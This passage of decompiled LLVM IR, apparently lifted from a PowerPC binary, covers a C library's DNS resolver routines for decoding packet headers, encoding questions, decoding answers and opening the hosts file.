  uselistorder i32 42, { 1, 0 }
  uselistorder i32 38, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_100150c4, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100150cc = load i8, i8* %arg1, align 1
  %v4_100150cc = zext i8 %v3_100150cc to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_100150d4 = add i32 %tmp, 1
  %v3_100150d4 = inttoptr i32 %v2_100150d4 to i8*
  %v4_100150d4 = load i8, i8* %v3_100150d4, align 1
  %v5_100150d4 = zext i8 %v4_100150d4 to i32
  %v1_100150dc = mul nuw nsw i32 %v4_100150cc, 256
  %v2_100150e0 = or i32 %v5_100150d4, %v1_100150dc
  %v2_100150e4 = inttoptr i32 %arg2 to i32*
  store i32 %v2_100150e0, i32* %v2_100150e4, align 4
  %v0_100150e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100150e8 = add i32 %v0_100150e8, 2
  %v2_100150e8 = inttoptr i32 %v1_100150e8 to i8*
  %v3_100150e8 = load i8, i8* %v2_100150e8, align 1
  %v4_100150e8 = zext i8 %v3_100150e8 to i32
  %v1_100150ec = call i32 @__asm_rlwinm(i32 %v4_100150e8, i32 25, i32 31, i32 31)
  %v2_100150f0 = add i32 %arg2, 4
  %v3_100150f0 = inttoptr i32 %v2_100150f0 to i32*
  store i32 %v1_100150ec, i32* %v3_100150f0, align 4
  %v0_100150f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100150f4 = add i32 %v0_100150f4, 2
  %v2_100150f4 = inttoptr i32 %v1_100150f4 to i8*
  %v3_100150f4 = load i8, i8* %v2_100150f4, align 1
  %v4_100150f4 = zext i8 %v3_100150f4 to i32
  %v1_100150f8 = call i32 @__asm_rlwinm(i32 %v4_100150f4, i32 29, i32 28, i32 31)
  %v2_100150fc = add i32 %arg2, 8
  %v3_100150fc = inttoptr i32 %v2_100150fc to i32*
  store i32 %v1_100150f8, i32* %v3_100150fc, align 4
  %v0_10015100 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015100 = add i32 %v0_10015100, 2
  %v2_10015100 = inttoptr i32 %v1_10015100 to i8*
  %v3_10015100 = load i8, i8* %v2_10015100, align 1
  %v4_10015100 = zext i8 %v3_10015100 to i32
  %v1_10015104 = call i32 @__asm_rlwinm(i32 %v4_10015100, i32 30, i32 31, i32 31)
  %v2_10015108 = add i32 %arg2, 12
  %v3_10015108 = inttoptr i32 %v2_10015108 to i32*
  store i32 %v1_10015104, i32* %v3_10015108, align 4
  %v0_1001510c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001510c = add i32 %v0_1001510c, 2
  %v2_1001510c = inttoptr i32 %v1_1001510c to i8*
  %v3_1001510c = load i8, i8* %v2_1001510c, align 1
  %v4_1001510c = zext i8 %v3_1001510c to i32
  %v1_10015110 = call i32 @__asm_rlwinm(i32 %v4_1001510c, i32 31, i32 31, i32 31)
  %v2_10015114 = add i32 %arg2, 16
  %v3_10015114 = inttoptr i32 %v2_10015114 to i32*
  store i32 %v1_10015110, i32* %v3_10015114, align 4
  %v0_10015118 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015118 = add i32 %v0_10015118, 2
  %v2_10015118 = inttoptr i32 %v1_10015118 to i8*
  %v3_10015118 = load i8, i8* %v2_10015118, align 1
  %tmp1 = urem i8 %v3_10015118, 2
  %v1_1001511c = zext i8 %tmp1 to i32
  %v2_10015120 = add i32 %arg2, 20
  %v3_10015120 = inttoptr i32 %v2_10015120 to i32*
  store i32 %v1_1001511c, i32* %v3_10015120, align 4
  %v0_10015124 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015124 = add i32 %v0_10015124, 3
  %v2_10015124 = inttoptr i32 %v1_10015124 to i8*
  %v3_10015124 = load i8, i8* %v2_10015124, align 1
  %v4_10015124 = zext i8 %v3_10015124 to i32
  %v1_10015128 = call i32 @__asm_rlwinm(i32 %v4_10015124, i32 25, i32 31, i32 31)
  %v2_1001512c = add i32 %arg2, 24
  %v3_1001512c = inttoptr i32 %v2_1001512c to i32*
  store i32 %v1_10015128, i32* %v3_1001512c, align 4
  %v0_10015130 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015130 = add i32 %v0_10015130, 3
  %v2_10015130 = inttoptr i32 %v1_10015130 to i8*
  %v3_10015130 = load i8, i8* %v2_10015130, align 1
  %tmp2 = urem i8 %v3_10015130, 16
  %v1_10015134 = zext i8 %tmp2 to i32
  %v2_10015138 = add i32 %arg2, 28
  %v3_10015138 = inttoptr i32 %v2_10015138 to i32*
  store i32 %v1_10015134, i32* %v3_10015138, align 4
  %v0_1001513c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001513c = add i32 %v0_1001513c, 4
  %v2_1001513c = inttoptr i32 %v1_1001513c to i8*
  %v3_1001513c = load i8, i8* %v2_1001513c, align 1
  %v4_1001513c = zext i8 %v3_1001513c to i32
  %v1_10015140 = add i32 %v0_1001513c, 5
  %v2_10015140 = inttoptr i32 %v1_10015140 to i8*
  %v3_10015140 = load i8, i8* %v2_10015140, align 1
  %v4_10015140 = zext i8 %v3_10015140 to i32
  %v1_10015144 = mul nuw nsw i32 %v4_1001513c, 256
  %v2_10015148 = or i32 %v4_10015140, %v1_10015144
  %v2_1001514c = add i32 %arg2, 32
  %v3_1001514c = inttoptr i32 %v2_1001514c to i32*
  store i32 %v2_10015148, i32* %v3_1001514c, align 4
  %v0_10015150 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015150 = add i32 %v0_10015150, 6
  %v2_10015150 = inttoptr i32 %v1_10015150 to i8*
  %v3_10015150 = load i8, i8* %v2_10015150, align 1
  %v4_10015150 = zext i8 %v3_10015150 to i32
  %v1_10015154 = add i32 %v0_10015150, 7
  %v2_10015154 = inttoptr i32 %v1_10015154 to i8*
  %v3_10015154 = load i8, i8* %v2_10015154, align 1
  %v4_10015154 = zext i8 %v3_10015154 to i32
  %v1_10015158 = mul nuw nsw i32 %v4_10015150, 256
  %v2_1001515c = or i32 %v4_10015154, %v1_10015158
  %v2_10015160 = add i32 %arg2, 36
  %v3_10015160 = inttoptr i32 %v2_10015160 to i32*
  store i32 %v2_1001515c, i32* %v3_10015160, align 4
  %v0_10015164 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015164 = add i32 %v0_10015164, 8
  %v2_10015164 = inttoptr i32 %v1_10015164 to i8*
  %v3_10015164 = load i8, i8* %v2_10015164, align 1
  %v4_10015164 = zext i8 %v3_10015164 to i32
  %v1_10015168 = add i32 %v0_10015164, 9
  %v2_10015168 = inttoptr i32 %v1_10015168 to i8*
  %v3_10015168 = load i8, i8* %v2_10015168, align 1
  %v4_10015168 = zext i8 %v3_10015168 to i32
  %v1_1001516c = mul nuw nsw i32 %v4_10015164, 256
  %v2_10015170 = or i32 %v4_10015168, %v1_1001516c
  %v2_10015174 = add i32 %arg2, 40
  %v3_10015174 = inttoptr i32 %v2_10015174 to i32*
  store i32 %v2_10015170, i32* %v3_10015174, align 4
  %v0_10015178 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015178 = add i32 %v0_10015178, 10
  %v2_10015178 = inttoptr i32 %v1_10015178 to i8*
  %v3_10015178 = load i8, i8* %v2_10015178, align 1
  %v4_10015178 = zext i8 %v3_10015178 to i32
  %v1_1001517c = add i32 %v0_10015178, 11
  %v2_1001517c = inttoptr i32 %v1_1001517c to i8*
  %v3_1001517c = load i8, i8* %v2_1001517c, align 1
  %v4_1001517c = zext i8 %v3_1001517c to i32
  store i32 %v4_1001517c, i32* %r9.global-to-local, align 4
  %v1_10015180 = mul nuw nsw i32 %v4_10015178, 256
  %v2_10015184 = or i32 %v4_1001517c, %v1_10015180
  %v2_10015188 = add i32 %arg2, 44
  %v3_10015188 = inttoptr i32 %v2_10015188 to i32*
  store i32 %v2_10015184, i32* %v3_10015188, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 10, 11, 12, 13, 14, 17, 16, 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 11, { 7, 8, 9, 16, 3, 10, 0, 1, 11, 12, 13, 14, 15, 2, 5, 4, 6 }
  uselistorder i32 7, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4 }
  uselistorder i32 5, { 17, 18, 8, 9, 10, 2, 3, 11, 0, 12, 13, 1, 19, 20, 4, 14, 15, 5, 6, 7, 16 }
  uselistorder i8 2, { 0, 4, 1, 5, 2, 6, 3 }
  uselistorder i32 30, { 7, 5, 8, 9, 10, 11, 0, 1, 2, 6, 12, 3, 4, 13, 14, 15, 16 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_100151ac = load i32, i32* %arg1, align 4
  store i32 %v2_100151ac, i32* %r3.global-to-local, align 4
  store i32 268521908, i32* @lr, align 4
  %v1_100151b0 = inttoptr i32 %v2_100151ac to i8*
  %v2_100151b0 = call i32 @__encode_dotted(i8* %v1_100151b0)
  store i32 %v2_100151b0, i32* %r3.global-to-local, align 4
  %v1_100151b4 = icmp slt i32 %v2_100151b0, 0
  %v1_100151b8 = load i32, i32* @r29, align 4
  %v2_100151b8 = sub i32 %v1_100151b8, %v2_100151b0
  store i32 %v2_100151b8, i32* @r29, align 4
  br i1 %v1_100151b4, label %dec_label_pc_100151f8, label %dec_label_pc_100151c4

dec_label_pc_100151c4:                            ; preds = %entry
  %v2_100151bc = icmp sgt i32 %v2_100151b8, 3
  %v0_100151c4 = load i32, i32* @r30, align 4
  %v2_100151c4 = add i32 %v0_100151c4, %v2_100151b0
  store i32 %v2_100151c4, i32* %r9.global-to-local, align 4
  br i1 %v2_100151bc, label %dec_label_pc_100151d4, label %dec_label_pc_100151cc

dec_label_pc_100151cc:                            ; preds = %dec_label_pc_100151c4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100151f8

dec_label_pc_100151d4:                            ; preds = %dec_label_pc_100151c4
  %v0_100151d4 = load i32, i32* @r31, align 4
  %v1_100151d4 = add i32 %v0_100151d4, 6
  %v2_100151d4 = inttoptr i32 %v1_100151d4 to i8*
  %v3_100151d4 = load i8, i8* %v2_100151d4, align 1
  %v5_100151d8 = inttoptr i32 %v2_100151c4 to i8*
  store i8 %v3_100151d4, i8* %v5_100151d8, align 1
  %v0_100151dc = load i32, i32* %r3.global-to-local, align 4
  %v1_100151dc = add i32 %v0_100151dc, 4
  store i32 %v1_100151dc, i32* %r3.global-to-local, align 4
  %v0_100151e0 = load i32, i32* @r31, align 4
  %v1_100151e0 = add i32 %v0_100151e0, 4
  %v2_100151e0 = inttoptr i32 %v1_100151e0 to i32*
  %v3_100151e0 = load i32, i32* %v2_100151e0, align 4
  %v1_100151e4 = trunc i32 %v3_100151e0 to i8
  %v2_100151e4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100151e4 = add i32 %v2_100151e4, 1
  %v4_100151e4 = inttoptr i32 %v3_100151e4 to i8*
  store i8 %v1_100151e4, i8* %v4_100151e4, align 1
  %v0_100151e8 = load i32, i32* @r31, align 4
  %v1_100151e8 = add i32 %v0_100151e8, 10
  %v2_100151e8 = inttoptr i32 %v1_100151e8 to i8*
  %v3_100151e8 = load i8, i8* %v2_100151e8, align 1
  %v2_100151ec = load i32, i32* %r9.global-to-local, align 4
  %v3_100151ec = add i32 %v2_100151ec, 2
  %v4_100151ec = inttoptr i32 %v3_100151ec to i8*
  store i8 %v3_100151e8, i8* %v4_100151ec, align 1
  %v0_100151f0 = load i32, i32* @r31, align 4
  %v1_100151f0 = add i32 %v0_100151f0, 8
  %v2_100151f0 = inttoptr i32 %v1_100151f0 to i32*
  %v3_100151f0 = load i32, i32* %v2_100151f0, align 4
  %v1_100151f4 = trunc i32 %v3_100151f0 to i8
  %v2_100151f4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100151f4 = add i32 %v2_100151f4, 3
  %v4_100151f4 = inttoptr i32 %v3_100151f4 to i8*
  store i8 %v1_100151f4, i8* %v4_100151f4, align 1
  %v0_10015208.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100151f8

dec_label_pc_100151f8:                            ; preds = %entry, %dec_label_pc_100151cc, %dec_label_pc_100151d4
  %v0_10015208 = phi i32 [ %v2_100151b0, %entry ], [ -1, %dec_label_pc_100151cc ], [ %v0_10015208.pre, %dec_label_pc_100151d4 ]
  ret i32 %v0_10015208

; uselistorder directives
  uselistorder i32 %v2_100151b0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_100151f8, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268522012, i32* @lr, align 4
  %v0_10015218 = call i32 @__length_dotted()
  %v1_1001521c = icmp slt i32 %v0_10015218, 0
  br i1 %v1_1001521c, label %dec_label_pc_10015228, label %dec_label_pc_10015224

dec_label_pc_10015224:                            ; preds = %entry
  %v1_10015224 = add i32 %v0_10015218, 4
  br label %dec_label_pc_10015228

dec_label_pc_10015228:                            ; preds = %entry, %dec_label_pc_10015224
  %v0_10015234 = phi i32 [ %v0_10015218, %entry ], [ %v1_10015224, %dec_label_pc_10015224 ]
  ret i32 %v0_10015234

; uselistorder directives
  uselistorder label %dec_label_pc_10015228, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1001523c = load i32, i32* @lr, align 4
  store i32 %v0_1001523c, i32* %r0.global-to-local, align 4
  %v2_10015244 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10015244, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268522088, i32* @lr, align 4
  %v2_10015264 = call i32 @__decode_dotted(i32 %v2_10015244, i32 256)
  store i32 %v2_10015264, i32* @r27, align 4
  %v1_10015268 = icmp slt i32 %v2_10015264, 0
  %v0_1001526c = load i32, i32* @r28, align 4
  %v2_1001526c = add i32 %v0_1001526c, %v2_10015264
  store i32 %v2_1001526c, i32* @r28, align 4
  %v1_10015270 = load i32, i32* @r29, align 4
  %v2_10015270 = sub i32 %v1_10015270, %v2_1001526c
  %v1_10015274 = add i32 %v2_10015270, -10
  br i1 %v1_10015268, label %dec_label_pc_10015330, label %dec_label_pc_10015280

dec_label_pc_10015280:                            ; preds = %entry
  %v0_10015284 = load i32, i32* @r26, align 4
  %v2_10015284 = add i32 %v0_10015284, %v2_1001526c
  store i32 %v2_10015284, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10015274, -1
  br i1 %tmp6, label %dec_label_pc_10015294, label %dec_label_pc_1001528c

dec_label_pc_1001528c:                            ; preds = %dec_label_pc_10015280
  store i32 %v1_10015274, i32* @r27, align 4
  br label %dec_label_pc_10015330

dec_label_pc_10015294:                            ; preds = %dec_label_pc_10015280
  store i32 268522136, i32* @lr, align 4
  %v1_10015294 = call i32 @__GI_strdup(i32 %v2_10015244)
  %v0_10015298 = load i32, i32* @r30, align 4
  %v1_10015298 = add i32 %v0_10015298, 2
  store i32 %v1_10015298, i32* %r8.global-to-local, align 4
  %v1_1001529c = load i32, i32* @r31, align 4
  %v2_1001529c = inttoptr i32 %v1_1001529c to i32*
  store i32 %v1_10015294, i32* %v2_1001529c, align 4
  %v0_100152a0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100152a0 = add i32 %v0_100152a0, 2
  store i32 %v1_100152a0, i32* %r10.global-to-local, align 4
  %v0_100152a4 = load i32, i32* @r30, align 4
  %v1_100152a4 = add i32 %v0_100152a4, 10
  store i32 %v1_100152a4, i32* %r6.global-to-local, align 4
  %v0_100152a8 = load i32, i32* @r26, align 4
  %v1_100152a8 = load i32, i32* @r28, align 4
  %v2_100152a8 = add i32 %v1_100152a8, %v0_100152a8
  %v3_100152a8 = inttoptr i32 %v2_100152a8 to i8*
  %v4_100152a8 = load i8, i8* %v3_100152a8, align 1
  %v5_100152a8 = zext i8 %v4_100152a8 to i32
  store i32 %v5_100152a8, i32* %r0.global-to-local, align 4
  %v1_100152ac = add i32 %v0_100152a4, 1
  %v2_100152ac = inttoptr i32 %v1_100152ac to i8*
  %v3_100152ac = load i8, i8* %v2_100152ac, align 1
  %v4_100152ac = zext i8 %v3_100152ac to i32
  store i32 %v4_100152ac, i32* %r9.global-to-local, align 4
  %v1_100152b0 = mul nuw nsw i32 %v5_100152a8, 256
  %v2_100152b4 = or i32 %v4_100152ac, %v1_100152b0
  store i32 %v2_100152b4, i32* %r0.global-to-local, align 4
  %v1_100152b8 = load i32, i32* @r31, align 4
  %v2_100152b8 = add i32 %v1_100152b8, 4
  %v3_100152b8 = inttoptr i32 %v2_100152b8 to i32*
  store i32 %v2_100152b4, i32* %v3_100152b8, align 4
  %v0_100152bc = load i32, i32* @r30, align 4
  %v1_100152bc = add i32 %v0_100152bc, 2
  %v2_100152bc = inttoptr i32 %v1_100152bc to i8*
  %v3_100152bc = load i8, i8* %v2_100152bc, align 1
  %v4_100152bc = zext i8 %v3_100152bc to i32
  store i32 %v4_100152bc, i32* %r0.global-to-local, align 4
  %v0_100152c0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100152c0 = add i32 %v0_100152c0, 1
  %v2_100152c0 = inttoptr i32 %v1_100152c0 to i8*
  %v3_100152c0 = load i8, i8* %v2_100152c0, align 1
  %v4_100152c0 = zext i8 %v3_100152c0 to i32
  store i32 %v4_100152c0, i32* %r9.global-to-local, align 4
  %v1_100152c4 = mul nuw nsw i32 %v4_100152bc, 256
  %v2_100152c8 = or i32 %v4_100152c0, %v1_100152c4
  store i32 %v2_100152c8, i32* %r0.global-to-local, align 4
  %v1_100152cc = load i32, i32* @r31, align 4
  %v2_100152cc = add i32 %v1_100152cc, 8
  %v3_100152cc = inttoptr i32 %v2_100152cc to i32*
  store i32 %v2_100152c8, i32* %v3_100152cc, align 4
  %v0_100152d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100152d0 = add i32 %v0_100152d0, 2
  %v2_100152d0 = inttoptr i32 %v1_100152d0 to i8*
  %v3_100152d0 = load i8, i8* %v2_100152d0, align 1
  %v4_100152d0 = zext i8 %v3_100152d0 to i32
  store i32 %v4_100152d0, i32* %r0.global-to-local, align 4
  %v0_100152d4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100152d4 = add i32 %v0_100152d4, 1
  %v2_100152d4 = inttoptr i32 %v1_100152d4 to i8*
  %v3_100152d4 = load i8, i8* %v2_100152d4, align 1
  %v4_100152d4 = zext i8 %v3_100152d4 to i32
  store i32 %v4_100152d4, i32* %r11.global-to-local, align 4
  %v1_100152d8 = add i32 %v0_100152d4, 3
  %v2_100152d8 = inttoptr i32 %v1_100152d8 to i8*
  %v3_100152d8 = load i8, i8* %v2_100152d8, align 1
  %v4_100152d8 = zext i8 %v3_100152d8 to i32
  %v1_100152dc = mul nuw i32 %v4_100152d0, 16777216
  store i32 %v1_100152dc, i32* %r0.global-to-local, align 4
  %v1_100152e0 = add i32 %v0_100152d4, 2
  %v2_100152e0 = inttoptr i32 %v1_100152e0 to i8*
  %v3_100152e0 = load i8, i8* %v2_100152e0, align 1
  %v4_100152e0 = zext i8 %v3_100152e0 to i32
  %v1_100152e4 = mul nuw nsw i32 %v4_100152d4, 65536
  %v2_100152e8 = or i32 %v1_100152e4, %v1_100152dc
  %v0_100152ec = load i32, i32* @r28, align 4
  %v1_100152ec = add i32 %v0_100152ec, 10
  store i32 %v1_100152ec, i32* %r11.global-to-local, align 4
  %v2_100152f0 = or i32 %v2_100152e8, %v4_100152d8
  store i32 %v2_100152f0, i32* %r0.global-to-local, align 4
  %v1_100152f4 = mul nuw nsw i32 %v4_100152e0, 256
  %v2_100152f8 = or i32 %v1_100152f4, %v2_100152f0
  store i32 %v2_100152f8, i32* %r9.global-to-local, align 4
  %v1_100152fc = load i32, i32* @r31, align 4
  %v2_100152fc = add i32 %v1_100152fc, 12
  %v3_100152fc = inttoptr i32 %v2_100152fc to i32*
  store i32 %v2_100152f8, i32* %v3_100152fc, align 4
  %v0_10015300 = load i32, i32* %r8.global-to-local, align 4
  %v1_10015300 = add i32 %v0_10015300, 6
  %v2_10015300 = inttoptr i32 %v1_10015300 to i8*
  %v3_10015300 = load i8, i8* %v2_10015300, align 1
  %v4_10015300 = zext i8 %v3_10015300 to i32
  store i32 %v4_10015300, i32* %r9.global-to-local, align 4
  %v0_10015304 = load i32, i32* @r30, align 4
  %v1_10015304 = add i32 %v0_10015304, 9
  %v2_10015304 = inttoptr i32 %v1_10015304 to i8*
  %v3_10015304 = load i8, i8* %v2_10015304, align 1
  %v4_10015304 = zext i8 %v3_10015304 to i32
  store i32 %v4_10015304, i32* %r0.global-to-local, align 4
  %v1_10015308 = mul nuw nsw i32 %v4_10015300, 256
  store i32 %v1_10015308, i32* %r9.global-to-local, align 4
  %v0_1001530c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001530c = load i32, i32* @r31, align 4
  %v2_1001530c = add i32 %v1_1001530c, 24
  %v3_1001530c = inttoptr i32 %v2_1001530c to i32*
  store i32 %v0_1001530c, i32* %v3_1001530c, align 4
  %v0_10015310 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015310 = load i32, i32* %r0.global-to-local, align 4
  %v2_10015310 = or i32 %v1_10015310, %v0_10015310
  store i32 %v2_10015310, i32* %r9.global-to-local, align 4
  %v0_10015314 = load i32, i32* %r6.global-to-local, align 4
  %v1_10015314 = load i32, i32* @r31, align 4
  %v2_10015314 = add i32 %v1_10015314, 20
  %v3_10015314 = inttoptr i32 %v2_10015314 to i32*
  store i32 %v0_10015314, i32* %v3_10015314, align 4
  %v0_10015318 = load i32, i32* @r29, align 4
  %v1_10015318 = load i32, i32* %r9.global-to-local, align 4
  %v2_10015318 = icmp slt i32 %v0_10015318, %v1_10015318
  %v1_1001531c = add i32 %v1_10015318, 10
  store i32 %v1_1001531c, i32* %r0.global-to-local, align 4
  %v0_10015320 = load i32, i32* @r27, align 4
  %v2_10015320 = add i32 %v0_10015320, %v1_1001531c
  store i32 %v2_10015320, i32* @r27, align 4
  %v1_10015324 = load i32, i32* @r31, align 4
  %v2_10015324 = add i32 %v1_10015324, 16
  %v3_10015324 = inttoptr i32 %v2_10015324 to i32*
  store i32 %v1_10015318, i32* %v3_10015324, align 4
  br i1 %v2_10015318, label %dec_label_pc_1001532c, label %dec_label_pc_10015294.dec_label_pc_10015330_crit_edge

dec_label_pc_10015294.dec_label_pc_10015330_crit_edge: ; preds = %dec_label_pc_10015294
  %v0_10015334.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10015330

dec_label_pc_1001532c:                            ; preds = %dec_label_pc_10015294
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10015330

dec_label_pc_10015330:                            ; preds = %dec_label_pc_10015294.dec_label_pc_10015330_crit_edge, %entry, %dec_label_pc_1001528c, %dec_label_pc_1001532c
  %v0_10015334 = phi i32 [ %v0_10015334.pre, %dec_label_pc_10015294.dec_label_pc_10015330_crit_edge ], [ %v2_10015264, %entry ], [ %v1_10015274, %dec_label_pc_1001528c ], [ -1, %dec_label_pc_1001532c ]
  store i32 %v0_1001523c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10015334

; uselistorder directives
  uselistorder i32 %v1_10015318, { 1, 0, 2 }
  uselistorder i32 %v1_100152dc, { 1, 0 }
  uselistorder i32 %v1_10015274, { 1, 2, 0 }
  uselistorder i32 %v2_10015264, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10015244, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 65536, { 0, 38, 1, 2, 40, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 39, 17, 18, 20, 19, 21, 23, 22, 24, 25, 26, 29, 28, 27, 31, 32, 30, 33, 35, 36, 34, 37 }
  uselistorder i32 3, { 44, 45, 46, 47, 48, 49, 50, 51, 52, 1, 53, 54, 2, 0, 8, 17, 19, 18, 10, 20, 55, 9, 65, 3, 56, 57, 58, 59, 21, 60, 61, 22, 23, 24, 25, 26, 38, 66, 67, 39, 70, 41, 14, 4, 5, 64, 68, 69, 6, 75, 76, 77, 71, 72, 73, 74, 12, 63, 62, 27, 7, 13, 28, 29, 40, 15, 30, 16, 31, 32, 33, 42, 43, 34, 35, 36, 37, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 2, 1, 0 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 48, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 49, 16, 44, 17, 18, 19, 20, 21, 22, 23, 24, 50, 25, 51, 52, 54, 26, 27, 28, 29, 30, 53, 47, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 41, 42, 43 }
  uselistorder label %dec_label_pc_10015330, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_1001534c = load i32, i32* @lr, align 4
  store i32 268522352, i32* @lr, align 4
  %v3_1001536c = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1001a678.730 to i32), i32 ptrtoint (i32* @global_var_1001a614.693 to i32))
  %v3_10015374 = icmp eq i32 %v3_1001536c, 0
  br i1 %v3_10015374, label %dec_label_pc_1001537c, label %dec_label_pc_10015398

dec_label_pc_1001537c:                            ; preds = %entry
  %v0_10015370 = load i32, i32* @r29, align 4
  store i32 %v0_1001534c, i32* @lr, align 4
  %v3_10015394 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1001a684.731 to i32), i32 %v0_10015370)
  br label %dec_label_pc_10015398

dec_label_pc_10015398:                            ; preds = %entry, %dec_label_pc_1001537c
  %v0_100153a8 = phi i32 [ %v3_1001536c, %entry ], [ %v3_10015394, %dec_label_pc_1001537c ]
  ret i32 %v0_100153a8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10015398, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_100153ac = load i32, i32* @lr, align 4
  store i32 %arg6, i32* @r30, align 4
  %v1_100153c0 = sub i32 0, %arg6
  %v1_100153c4 = urem i32 %v1_100153c0, 4
  store i32 %v1_100153c4, i32* %r0.global-to-local, align 4
  %v3_100153c4 = icmp eq i32 %v1_100153c4, 0
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_100153dc = load i32, i32* @r10, align 4
  store i32 %v0_100153dc, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_100153f8.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_100153c4, label %dec_label_pc_100153f8, label %dec_label_pc_100153e8

dec_label_pc_100153e8:                            ; preds = %entry
  %v2_100153e8 = icmp ult i32 %v0_100153f8.pr, %v1_100153c4
  br i1 %v2_100153e8, label %dec_label_pc_100156ac, label %dec_label_pc_100153f0

dec_label_pc_100153f0:                            ; preds = %dec_label_pc_100153e8
  %v2_100153f0 = sub i32 %v0_100153f8.pr, %v1_100153c4
  store i32 %v2_100153f0, i32* %r9.global-to-local, align 4
  %v2_100153f4 = add i32 %v1_100153c4, %arg6
  store i32 %v2_100153f4, i32* @r30, align 4
  br label %dec_label_pc_100153f8

dec_label_pc_100153f8:                            ; preds = %entry, %dec_label_pc_100153f0
  %v0_10015404 = phi i32 [ %v2_100153f4, %dec_label_pc_100153f0 ], [ %arg6, %entry ]
  %v0_10015408 = phi i32 [ %v2_100153f0, %dec_label_pc_100153f0 ], [ %v0_100153f8.pr, %entry ]
